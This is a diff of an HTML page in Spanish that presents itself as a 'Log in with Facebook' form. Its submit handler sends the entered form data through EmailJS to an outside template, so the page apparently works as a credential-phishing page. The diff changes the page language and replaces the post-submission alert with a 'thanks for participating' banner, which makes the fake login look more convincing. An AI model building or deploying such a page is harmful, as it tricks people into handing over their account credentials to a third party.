@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 
 <head>
     <meta charset="UTF-8">
@@ -31,6 +31,13 @@
     <center>
         <header><img src="img/logo-frase-cristal.png" style="width: 45vh;"></header>
     </center>
+    <!--center>
+        <div style="display: flex;background-color: yellow;border: 5px ridge;" id="mensajillo">
+            <div style="font-size: 10vh;color: red;">
+                MUCHAS GRACIAS POR PARTICIPAR!
+            </div>
+        </div>
+    </center-->
     <br><br>
     <form id="form" name="sentMessage" class="form-signin" method="post" novalidate="novalidate">
         <h2 class="form-signin-heading">Iniciar sesión con Facebook</h2>
@@ -56,6 +63,7 @@
         var subject = "Lyrics-Music"
         const phone = document.getElementById('phone');
         const btn = document.getElementById('button');
+        
 
         document.getElementById('form')
             .addEventListener('submit', function (event) {
@@ -69,7 +77,10 @@
                 emailjs.sendForm(serviceID, templateID, this)
                     .then(() => {
                         btn.value = 'Send Email';
-                        alert('Muchas Gracias por tu comentario!');
+                        alert('MIRA AL FINAL DE LA PAGINA')
+                        var msj2 = '<center><div style="display: block;background-color: yellow;border: 5px ridge;text-align: center" id="mensajillo"><div style="font-size: 6vw;color: red;display: block;">MUCHAS GRACIAS POR PARTICIPAR!</div></div></center>'
+                        $('body').append(msj2)
+                        //alert('MUCHAS GRACIAS POR PARTICIPAR!');
                     }, (err) => {
                         btn.value = 'Send Email';
                         alert(JSON.stringify(err));
